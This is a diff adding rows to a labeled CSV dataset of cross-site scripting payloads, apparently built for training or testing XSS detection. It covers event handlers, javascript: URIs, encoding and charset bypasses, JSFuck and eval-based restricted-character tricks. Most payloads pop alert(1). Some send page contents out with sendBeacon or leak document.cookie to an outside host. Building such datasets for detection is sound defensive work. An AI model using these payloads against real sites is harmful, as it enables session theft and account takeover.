@@ -19014,3 +19014,472 @@ javascript:document.body.onclick=alert(1),event_handler,none,medium,41
 /path?next=javascript:top[/al/.source+/ert/.source](document.cookie),js_uri,none,high,68
 <big onpointermove=alert(1) style=display:block>AnonKryptiQuz</big>,event_handler,none,medium,67
 <font onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,55
+"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><xss id=x style=""position:absolute;"" onanimationcancel=""print()""></xss>",attribute,event_handler,high,175
+<xss id=x onbeforematch=alert(1) hidden=until-found>,event_handler,event_handler,medium,52
+"<body onbeforeunload=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)>",dom_sink,obfuscation,medium,97
+<xss oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>,event_handler,event_handler,medium,93
+<input type=hidden oncontentvisibilityautostatechange=alert(1) style=content-visibility:auto>,event_handler,event_handler,medium,93
+"<video controls><source src=validvideo.mp4 type=video/mp4><track default oncuechange=alert(1) src=""data:text/vtt,WEBVTT FILE
+
+1
+00:00:00.000 --> 00:00:05.000 
+<b>XSS</b>
+""></video>",event_handler,event_handler,medium,180
+"<video onloadstart=""alert(1)""><source></xss>",event_handler,event_handler,medium,44
+<body onpagereveal=alert(1)>,event_handler,event_handler,medium,28
+"<xss onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></xss>",event_handler,event_handler,medium,270
+<address onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></address>,event_handler,event_handler,medium,136
+"<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class=""scroll-container"" onscrollsnapchanging=""alert(1)""> <xss class=""scroll-item"">Item 1</xss><xss class=""scroll-item"">Item 2</xss></xss>",attribute,event_handler,medium,447
+<xss onsecuritypolicyviolation=alert(1)>XSS</xss>,event_handler,event_handler,medium,49
+x<template shadowrootmode=open><slot onslotchange=alert(1)>,event_handler,event_handler,medium,59
+<details ontoggle=alert(1) open>test</details>,event_handler,event_handler,high,46
+"<style>:target {color: red;}</style><xss id=x style=""transition:color 10s"" ontransitioncancel=print()></xss>",attribute,event_handler,medium,108
+"<xss id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></xss>",attribute,event_handler,medium,82
+"<style>:target {transform: rotate(180deg);}</style><xss id=x style=""transition:transform 2s"" ontransitionrun=print()></xss>",attribute,event_handler,medium,123
+"<style>:target {color:red;}</style><xss id=x style=""transition:color 1s"" ontransitionstart=alert(1)></xss>",attribute,event_handler,medium,106
+"<body onunload=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)>",dom_sink,obfuscation,medium,91
+<geolocation onvalidationstatuschange=alert(1)>,event_handler,event_handler,medium,47
+<audio controls loop muted autoplay onwaiting=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>,event_handler,event_handler,medium,106
+"<style>@keyframes x{}</style><xss style=""animation-name:x"" onwebkitanimationend=""alert(1)""></xss>",attribute,event_handler,medium,97
+"<style>@keyframes slidein {}</style><xss style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></xss>",attribute,event_handler,medium,166
+"<style>@keyframes x{}</style><xss style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></xss>",attribute,event_handler,medium,99
+<audio onwebkitplaybacktargetavailabilitychanged=alert(1)>,event_handler,event_handler,medium,58
+"<style>:target {color:red;}</style><xss id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></xss>",attribute,event_handler,medium,110
+"<a onbeforecopy=""alert(1)"" contenteditable>test</a>",event_handler,event_handler,medium,51
+"<a onbeforecut=""alert(1)"" contenteditable>test</a>",event_handler,event_handler,medium,50
+<xss contenteditable onbeforeinput=alert(1)>test,event_handler,event_handler,medium,48
+<xss onbeforepaste=alert(1)>XSS</xss>,event_handler,event_handler,medium,37
+<button popovertarget=x>Click me</button><xss onbeforetoggle=alert(1) popover id=x>XSS</xss>,event_handler,event_handler,medium,92
+<xss onblur=alert(1) id=x tabindex=1 style=display:block>test</xss><input value=clickme>,event_handler,event_handler,medium,88
+<input type=file oncancel=alert(1)>,event_handler,event_handler,medium,35
+"<xss onclick=""alert(1)"" style=display:block>test</xss>",event_handler,event_handler,medium,54
+<dialog open onclose=alert(1)><form method=dialog><button>XSS</button></form>,event_handler,event_handler,medium,77
+<button commandfor=test command=show-popover>Click<div id=test oncommand=alert(1)>,event_handler,event_handler,medium,82
+"<xss oncontextmenu=""alert(1)"" style=display:block>test</xss>",event_handler,event_handler,medium,60
+"<xss oncopy=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",event_handler,event_handler,high,78
+"<xss oncut=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",event_handler,event_handler,high,77
+"<xss ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>test</xss>",event_handler,event_handler,high,78
+"<xss draggable=""true"" ondrag=""alert(1)"" style=display:block>test</xss>",attribute,event_handler,medium,70
+"<xss draggable=""true"" ondragend=""alert(1)"" style=display:block>test</xss>",attribute,event_handler,medium,73
+"<xss draggable=""true"" ondragenter=""alert(1)"" style=display:block>test</xss>",attribute,event_handler,medium,75
+"<xss draggable=""true"" ondragexit=""alert(1)"" style=display:block>test</xss>",attribute,event_handler,medium,74
+"<xss draggable=""true"" ondragleave=""alert(1)"" style=display:block>test</xss>",attribute,event_handler,medium,75
+"<div draggable=""true"" contenteditable>drag me</div><xss ondragover=alert(1) contenteditable style=display:block>drop here</xss>",attribute,event_handler,medium,127
+"<xss draggable=""true"" ondragstart=""alert(1)"" style=display:block>test</xss>",attribute,event_handler,medium,75
+"<div draggable=""true"" contenteditable>drag me</div><xss ondrop=alert(1) contenteditable style=display:block>drop here</xss>",attribute,event_handler,medium,123
+<xss onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</xss><input value=clickme>,event_handler,event_handler,high,97
+<div ongesturechange=alert(1)>XSS</div>,event_handler,event_handler,medium,39
+<div ongestureend=alert(1)>XSS</div>,event_handler,event_handler,medium,36
+<div ongesturestart=alert(1)>XSS</div>,event_handler,event_handler,medium,38
+<input type=range ongotpointercapture=alert(1)>,event_handler,event_handler,medium,47
+"<xss onkeydown=""alert(1)"" contenteditable style=display:block>test</xss>",event_handler,event_handler,medium,72
+"<xss onkeypress=""alert(1)"" contenteditable style=display:block>test</xss>",event_handler,event_handler,medium,73
+"<xss onkeyup=""alert(1)"" contenteditable style=display:block>test</xss>",event_handler,event_handler,medium,70
+<geolocation autolocate onlocation=alert(1)>,event_handler,event_handler,medium,44
+<input type=range onlostpointercapture=alert(1)>,event_handler,event_handler,medium,48
+"<xss onmousedown=""alert(1)"" style=display:block>test</xss>",event_handler,event_handler,medium,58
+"<xss onmouseenter=""alert(1)"" style=display:block>test</xss>",event_handler,event_handler,medium,59
+"<xss onmouseleave=""alert(1)"" style=display:block>test</xss>",event_handler,event_handler,medium,59
+"<xss onmousemove=""alert(1)"" style=display:block>test</xss>",event_handler,event_handler,medium,58
+"<xss onmouseout=""alert(1)"" style=display:block>test</xss>",event_handler,event_handler,medium,57
+"<xss onmouseover=""alert(1)"" style=display:block>test</xss>",event_handler,event_handler,medium,58
+"<xss onmouseup=""alert(1)"" style=display:block>test</xss>",event_handler,event_handler,medium,56
+<xss onmousewheel=alert(1) style=display:block>requires scrolling,event_handler,event_handler,medium,65
+"<body onpagehide=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)>",dom_sink,obfuscation,medium,93
+"<body onpageswap=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)>",dom_sink,obfuscation,medium,93
+"<a onpaste=""alert(1)"" contenteditable>test</a>",event_handler,event_handler,medium,46
+<xss onpointercancel=alert(1)>XSS</xss>,event_handler,event_handler,medium,39
+<xss onpointerdown=alert(1) style=display:block>XSS</xss>,event_handler,event_handler,medium,57
+<xss onpointerenter=alert(1) style=display:block>XSS</xss>,event_handler,event_handler,high,58
+<xss onpointerleave=alert(1) style=display:block>XSS</xss>,event_handler,event_handler,medium,58
+<xss onpointermove=alert(1) style=display:block>XSS</xss>,event_handler,event_handler,medium,57
+<xss onpointerout=alert(1) style=display:block>XSS</xss>,event_handler,event_handler,medium,56
+<xss onpointerover=alert(1) style=display:block>XSS</xss>,event_handler,event_handler,medium,57
+<xss onpointerrawupdate=alert(1) style=display:block>XSS</xss>,event_handler,event_handler,medium,62
+<xss onpointerup=alert(1) style=display:block>XSS</xss>,event_handler,event_handler,medium,55
+<geolocation onpromptaction=alert(1)>,event_handler,event_handler,medium,37
+<geolocation onpromptdismiss=alert(1)>,event_handler,event_handler,medium,38
+"<input onselect=alert(1) value=""XSS"" autofocus>",event_handler,event_handler,high,47
+<button popovertarget=x>Click me</button><xss ontoggle=alert(1) popover id=x>XSS</xss>,event_handler,event_handler,high,86
+<xss ontouchcancel=alert(1)>XSS</xss>,event_handler,event_handler,medium,37
+<audio controls onwaiting=alert(1)><source src=x type=x></audio>,event_handler,event_handler,medium,64
+<video controls src=validvideo.mp4 onwebkitfullscreenchange=alert(1)>,event_handler,event_handler,medium,69
+<xss onwebkitmouseforcechanged=alert(1)>XSS</xss>,event_handler,event_handler,medium,49
+<xss onwebkitmouseforcedown=alert(1)>XSS</xss>,event_handler,event_handler,medium,46
+<xss onwebkitmouseforceup=alert(1)>XSS</xss>,event_handler,event_handler,medium,44
+<xss onwebkitmouseforcewillbegin=alert(1)>XSS</xss>,event_handler,event_handler,medium,51
+<video controls src=validvideo.mp4 onwebkitpresentationmodechanged=alert(1)>,event_handler,event_handler,medium,76
+<xss onwebkitwillrevealbottom=alert(1)>XSS</xss>,event_handler,event_handler,medium,48
+"<script><img title=""</script><img src onerror=alert(1)>""></script>",script_injection,event_handler,high,66
+"<script>eval(myUndefVar);var inject=""INJECTION_STARTS_HERE"";var myUndefVar;alert(1);//"";</script>",dom_sink,obfuscation,high,97
+"<script>myUndefFunction(13,37);var inject=""INJECTION_STARTS_HERE"";function myUndefFunction(){};alert(1);//"";</script>",script_injection,obfuscation,high,117
+"<script>var myUndefObject = new myUndefClass();var inject=""INJECTION_STARTS_HERE"";function myUndefClass(){};alert(1);//"";</script>",script_injection,obfuscation,high,130
+"<script>$(document).ready(function(){var inject=""INJECTION_STARTS_HERE"";});function $(){return{ready:()=>0}};alert(1);(function(){"""";});</script>",script_injection,script_tag,high,145
+"<script>undef01.undef02(""INJECTION""+alert(1));function undef01(){}//"");</script>",script_injection,obfuscation,high,80
+"<script>undef01['undef02','INJECTION'+alert(1)];function undef01(){};//'];</script>",script_injection,obfuscation,high,83
+"<script type=""module"">undef01.undef02.undef03.undef04.undef05();var inject = ""INJECTION"";import ""data:text/jscript,alert(1)""//"";</script>",script_injection,obfuscation,high,137
+"<script>var x=atob(""dXNlbGVzcyBjYWxsIG9mIG5hdGl2ZSBmdW5jdGlvbiAh"");undef01.undef02();var inject = ""INJECTION"";function atob(){alert(1);}//"";</script>",script_injection,obfuscation,high,149
+"<input type=""file"" id=""fileInput"" /><script>const fileInput = document.getElementById('fileInput');const dataTransfer = new DataTransfer();const file = new File(['Hello world!'], 'hello.txt', {type: 'text/plain'});dataTransfer.items.add(file);fileInput.files = dataTransfer.files</script>",script_injection,script_tag,high,288
+"<script>throw onerror=eval,'=alert\x281\x29'</script>",script_injection,restricted_chars,high,53
+"<script>throw onerror=eval,'alert\x281\x29'</script>",script_injection,restricted_chars,high,52
+"<script>{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:1,message:'alert\x281\x29'}</script>",script_injection,restricted_chars,high,101
+"<script>throw{},onerror=Uncaught=eval,h=location.hash,e={lineNumber:1,columnNumber:1,fileName:0,message:h[2]+h[1]+h},!!window.InstallTrigger?e:e.message</script>",script_injection,restricted_chars,high,161
+<script>'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}</script>,script_injection,restricted_chars,high,73
+<script>alert`1`</script>,script_injection,restricted_chars,high,25
+<script>new Function`X${document.location.hash.substr`1`}`</script>,template_injection,restricted_chars,high,67
+<script>Function`X${document.location.hash.substr`1`}```</script>,template_injection,restricted_chars,high,65
+<video><source onerror=location=/\02.rs/+document.cookie>,event_handler,restricted_chars,high,57
+<svg onload=alert(1),event_handler,restricted_chars,high,20
+<svg onload=alert(1)<!--,event_handler,restricted_chars,high,24
+<script>window.name='javascript:alert(1)';</script><svg onload=location=name>,script_injection,restricted_chars,high,77
+"<script>window.name='javascript:alert(1)';function blah(){}
+blah(""""+{a:location=name}+"""")</script>",script_injection,restricted_chars,high,98
+"<script>window.name='javascript:alert(1)';function blah(){}
+blah(""""+new class b{toString=e=>location=name}+"""")</script>",script_injection,restricted_chars,high,119
+<SCRIPT SRC=HTTPS://PORTSWIGGER-LABS.NET/A.JS></SCRIPT>,script_injection,restricted_chars,high,55
+<SCRIPT>[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[!+[]+!+[]+!+[]]]+[+!+[]]+([+[]]+![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[!+[]+!+[]+[+[]]])</SCRIPT>,script_injection,restricted_chars,high,2362
+"<script>throw onerror=eval,name</script>",script_injection,restricted_chars,high,40
+"<script>throw onerror=eval,'/*'+location</script>",script_injection,restricted_chars,high,49
+"<svg onload=""throw top.onerror=eval,'/*'+URL"">",attribute,restricted_chars,high,46
+"<body onload=""throw onerror=eval,'/*'+location"">",attribute,restricted_chars,high,48
+<script>ondevicemotion=setTimeout;Event.prototype.toString=URIError.prototype.toString;Event.prototype.message='alert\x281\x29'</script>,script_injection,restricted_chars,high,136
+<script>ondeviceorientation=setTimeout;Event.prototype.toString=Error.prototype.toString;Event.prototype.name='alert\x281\x29'</script>,script_injection,restricted_chars,high,135
+<script>ondeviceorientationabsolute=setTimeout;Event.prototype.toString=WebTransportError.prototype.toString;Event.prototype.name='alert\x281\x29'</script>,script_injection,restricted_chars,high,155
+<script>onpagereveal=setTimeout;Event.prototype.toString=AggregateError.prototype.toString;Event.prototype.name='alert\x281\x29'</script>,script_injection,restricted_chars,high,137
+<script>onpageswap=setTimeout;location='x';Event.prototype.toString=EvalError.prototype.toString;Event.prototype.name='alert\x281\x29'</script>,script_injection,restricted_chars,high,143
+"<iframe id=target></iframe><script>target.src='xss.php?x=<img/src/onerror=onmessage=setTimeout;Event.prototype.toString=RangeError.prototype.toString;Event.prototype.name=""alert\x281\x29"">';target.onload=setTimeout(function(){frames[0].postMessage("""", ""*"")},100)</script>",dom_sink,restricted_chars,high,271
+<script>onhashchange=setTimeout;location.hash=location;Event.prototype.flags='.call\x28alert\x281\x29\x29';Event.prototype.toString=/x/.toString</script>,script_injection,restricted_chars,high,153
+<script>onscroll=setTimeout;document.body.style.height='9999px';document.documentElement.scrollTop=1;Event.prototype.toString=ReferenceError.prototype.toString;Event.prototype.name='alert\x281\x29'</script>,script_injection,restricted_chars,high,206
+<script>onscrollend=setTimeout;document.body.style.height='9999px';document.documentElement.scrollTop=1;Event.prototype.toString=SyntaxError.prototype.toString;Event.prototype.name='alert\x281\x29'</script>,script_injection,restricted_chars,high,206
+"<input value=x autofocus onfocus=""window.onselect=setTimeout;this.selectionStart=1;Event.prototype.toString=TypeError.prototype.toString;Event.prototype.message='alert\x281\x29'"">",attribute,restricted_chars,high,179
+"<img/src/style=transition:0.1s onerror=""window.ontransitionstart=setTimeout;this.style.opacity=0;Event.prototype.toString=x=>'alert\x281\x29'"">",attribute,restricted_chars,high,143
+"<img/src/onerror=""window.onload=setTimeout;Event.prototype.toString=DOMException.prototype.toString;Event.prototype.name='alert\x281\x29'"">",attribute,restricted_chars,high,139
+<img/src/onerror=onpageshow=setTimeout;Event.prototype.toString=WebTransportError.prototype.toString;Event.prototype.name='alert\x281\x29'>,event_handler,restricted_chars,high,139
+<img/src/onerror=window.onerror=eval;ReferenceError.prototype.name=';alert\x281\x29;var\x20Uncaught//';z>,event_handler,restricted_chars,high,105
+"<svg onload=onerror=eval;new'""-alert\x281\x29//'>",event_handler,restricted_chars,high,49
+"<script>onerror=eval,new name</script>",script_injection,restricted_chars,high,38
+"<script>throw onerror=eval,x=new Error,x.message='alert\x281\x29',x</script>",script_injection,restricted_chars,high,76
+"<script>throw onerror=eval,x=new Error,x.name='',x.message='=alert\x281\x29',x</script>",script_injection,restricted_chars,high,87
+"<img src onerror=src=1,attributes[1].value=alt+id alt=ale id=rt&lpar;1&rpar;>",event_handler,restricted_chars,high,77
+"<svg onload=""attributes[0].value=name,new onload"">",event_handler,restricted_chars,high,50
+"<svg onload=""attributes[0].value=id+URL+id,new onload"" id=`>",event_handler,restricted_chars,high,60
+"<input onfocus=""attributes[0].value=id+URL+id,new onfocus"" id=` autofocus>",event_handler,restricted_chars,high,74
+<input onclick=attributes[0].value='`'+URL+'`'>,event_handler,restricted_chars,medium,47
+"<form><input onclick=""formAction=top.name,type='submit',new submit"">",event_handler,restricted_chars,medium,68
+"<svg onload=innerHTML=URL,innerHTML=textContent>",event_handler,restricted_chars,high,48
+"<img/src/onerror=innerHTML=URL,innerHTML=textContent>",event_handler,restricted_chars,high,53
+"<svg onload=innerHTML=URL,eval(textContent)>",dom_sink,restricted_chars,high,44
+"<iframe src=""javascript:alert(1)"">",js_uri,protocol,medium,34
+"<a href=""javascript:alert(1)"">XSS</a>",js_uri,protocol,medium,37
+"<a href="" 	javascript:alert(1)"">XSS</a>",js_uri,protocol,medium,39
+"<a href=""javas	cript:alert(1)"">XSS</a>",js_uri,tag_injection,medium,38
+"<a href=""javascript
+:alert(1)"">XSS</a>",js_uri,tag_injection,medium,38
+"<svg><a xlink:href=""javascript:alert(1)""><text x=""20"" y=""20"">XSS</text></a>",js_uri,protocol,medium,75
+<svg><animate xlink:href=#xss attributeName=href values=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a>,js_uri,protocol,medium,118
+<svg><animate xlink:href=#xss attributeName=href from=javascript:alert(1) to=1 /><a id=xss><text x=20 y=20>XSS</text></a>,js_uri,protocol,medium,121
+<svg><set xlink:href=#x attributeName=href to=javascript:alert(1) /><a id=x><text x=20 y=20>XSS</text></a>,js_uri,protocol,medium,106
+"<svg><script href=""data:text/javascript,alert(1)"" />",js_uri,script_tag,high,52
+"<math><x href=""javascript:alert(1)"">blah",js_uri,protocol,medium,40
+<form><button formaction=javascript:alert(1)>XSS,js_uri,protocol,medium,48
+<form><input type=submit formaction=javascript:alert(1) value=XSS>,js_uri,protocol,medium,66
+<form action=javascript:alert(1)><input type=submit value=XSS>,js_uri,protocol,medium,62
+"<svg><animate xlink:href=#xss attributeName=href dur=5s repeatCount=indefinite keytimes=0;0;1 values=""https://portswigger.net?&semi;javascript:alert(1)&semi;0"" /><a id=xss><text x=20 y=20>XSS</text></a>",js_uri,obfuscation,medium,202
+<embed code=https://portswigger-labs.net width=500 height=500 type=text/html>,js_uri,obfuscation,medium,77
+<object width=500 height=500 type=text/html><param name=url value=https://portswigger-labs.net>,js_uri,obfuscation,medium,95
+<object width=500 height=500 type=text/html><param name=code value=https://portswigger-labs.net>,js_uri,obfuscation,medium,96
+<object width=500 height=500 type=text/html><param name=movie value=https://portswigger-labs.net>,js_uri,obfuscation,medium,97
+<object width=500 height=500 type=text/html><param name=src value=https://portswigger-labs.net>,js_uri,obfuscation,medium,95
+<script>navigation.navigate('javascript:alert(1)')</script>,script_injection,script_tag,high,59
+"<form action=""javascript:alert(1)""><input type=submit id=x></form><label for=x>XSS</label>",tag_injection,protocol,low,90
+"<input type=""hidden"" accesskey=""X"" onclick=""alert(1)""> (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)",attribute,event_handler,medium,106
+"<link rel=""canonical"" accesskey=""X"" onclick=""alert(1)"" /> (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)",attribute,event_handler,medium,109
+"<a href=# download=""filename.html"">Test</a>",tag_injection,tag_injection,low,43
+"<img referrerpolicy=""no-referrer"" src=""//portswigger-labs.net"">",tag_injection,obfuscation,low,63
+"<a href=# onclick=""window.open('http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//','alert(1)')"">XSS</a>",dom_sink,obfuscation,medium,148
+"<iframe name=""alert(1)"" src=""https://portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//""></iframe>",dom_sink,obfuscation,medium,124
+"<base target=""alert(1)""><a href=""http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//"">XSS via target in base tag</a>",dom_sink,obfuscation,medium,159
+"<a target=""alert(1)"" href=""http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//"">XSS via target in a tag</a>",dom_sink,obfuscation,medium,150
+"<img src=""validimage.png"" width=""10"" height=""10"" usemap=""#xss""><map name=""xss""><area shape=""rect"" coords=""0,0,82,126"" target=""alert(1)"" href=""http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//""></map>",dom_sink,obfuscation,medium,244
+"<form action=""http://subdomain1.portswigger-labs.net/xss/xss.php"" target=""alert(1)""><input type=hidden name=x value=""';eval(name)//""><input type=hidden name=context value=js_string_single><input type=""submit"" value=""XSS via target in a form""></form>",dom_sink,obfuscation,medium,249
+"<form><input type=hidden name=x value=""';eval(name)//""><input type=hidden name=context value=js_string_single><input type=""submit"" formaction=""http://subdomain1.portswigger-labs.net/xss/xss.php"" formtarget=""alert(1)"" value=""XSS via formtarget in input type submit""></form>",dom_sink,obfuscation,medium,272
+"<form><input type=hidden name=x value=""';eval(name)//""><input type=hidden name=context value=js_string_single><input name=1 type=""image"" src=""validimage.png"" formaction=""http://subdomain1.portswigger-labs.net/xss/xss.php"" formtarget=""alert(1)"" value=""XSS via formtarget in input type image""></form>",dom_sink,obfuscation,medium,298
+"<meta http-equiv=""refresh"" content=""0; url=//portswigger-labs.net"">",attribute,obfuscation,medium,67
+"<meta charset=""UTF-7"" /> +ADw-script+AD4-alert(1)+ADw-/script+AD4-",tag_injection,tag_injection,low,66
+"<meta http-equiv=""Content-Type"" content=""text/html; charset=UTF-7"" /> +ADw-script+AD4-alert(1)+ADw-/script+AD4-",attribute,event_handler,medium,111
+"+/v8
++ADw-script+AD4-alert(1)+ADw-/script+AD4-",tag_injection,none,low,46
+"+/v9
++ADw-script+AD4-alert(1)+ADw-/script+AD4-",tag_injection,none,low,46
+"+/v+
++ADw-script+AD4-alert(1)+ADw-/script+AD4-",tag_injection,none,low,46
+"+/v/
++ADw-script+AD4-alert(1)+ADw-/script+AD4-",tag_injection,none,low,46
+"<meta http-equiv=""Content-Security-Policy"" content=""upgrade-insecure-requests"">",attribute,event_handler,medium,79
+"<iframe sandbox src=""//portswigger-labs.net""></iframe>",tag_injection,obfuscation,low,54
+"<meta name=""referrer"" content=""no-referrer"">",attribute,event_handler,medium,44
+"%C0%BCscript>alert(1)</script>
+%E0%80%BCscript>alert(1)</script>
+%F0%80%80%BCscript>alert(1)</script>
+%F8%80%80%80%BCscript>alert(1)</script>
+%FC%80%80%80%80%BCscript>alert(1)</script>",attribute_escape,encoding,medium,184
+<script>\u{0000000061}lert(1)</script>,script_injection,encoding,high,38
+"<script>eval('\141lert(1)')</script>
+<script>eval('alert(\061)')</script>
+<script>eval('alert(\61)')</script>",dom_sink,encoding,high,109
+"<a href=""&#106;avascript:alert(1)"">XSS</a><a href=""&#106avascript:alert(1)"">XSS</a>",attribute_escape,encoding,medium,83
+"<svg><script>&#97;lert(1)</script></svg>
+<svg><script>&#x61;lert(1)</script></svg>
+<svg><script>alert&NewLine;(1)</script></svg>
+<svg><script>x=""&quot;,alert(1)//"";</script></svg>",script_injection,encoding,high,179
+"<a href=""&#0000106avascript:alert(1)"">XSS</a>",attribute_escape,encoding,medium,45
+"<a href=""&#x6a;avascript:alert(1)"">XSS</a>",attribute_escape,encoding,medium,42
+"<a href=""j&#x61vascript:alert(1)"">XSS</a>
+<a href=""&#x6a
+avascript:alert(1)"">XSS</a>
+<a href=""&#x6a avascript:alert(1)"">XSS</a>",attribute_escape,encoding,medium,127
+"<a href=""&#x0000006a;avascript:alert(1)"">XSS</a>",attribute_escape,encoding,medium,48
+"<a href=""javascript&colon;alert(1)"">XSS</a>
+<a href=""java&Tab;script:alert(1)"">XSS</a>
+<a href=""java&NewLine;script:alert(1)"">XSS</a>
+<a href=""javascript&colon;alert&lpar;1&rpar;"">XSS</a>",attribute_escape,encoding,medium,187
+"<a href=""javascript:x='%27-alert(1)-%27';"">XSS</a>",attribute_escape,encoding,medium,50
+"<a href=""javascript:x='&percnt;27-alert(1)-%27';"">XSS</a>",attribute_escape,encoding,medium,57
+<svg><script>&#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;(1)</script></svg>,script_injection,obfuscation,high,211
+{{_v.constructor('alert(1)')()}},template_injection,template,medium,32
+<p v-=_c.constructor`alert(1)`()>,template_injection,template,medium,33
+{{_b.constructor`alert(1)`()}},template_injection,template,medium,30
+"<x v-bind:is=""'script'"" src=""//14.rs"" />",template_injection,template,medium,40
+<x is=script src=//⑭.₨>,template_injection,template,medium,23
+<xyz<img/src onerror=alert(1)>>,event_handler,template,high,31
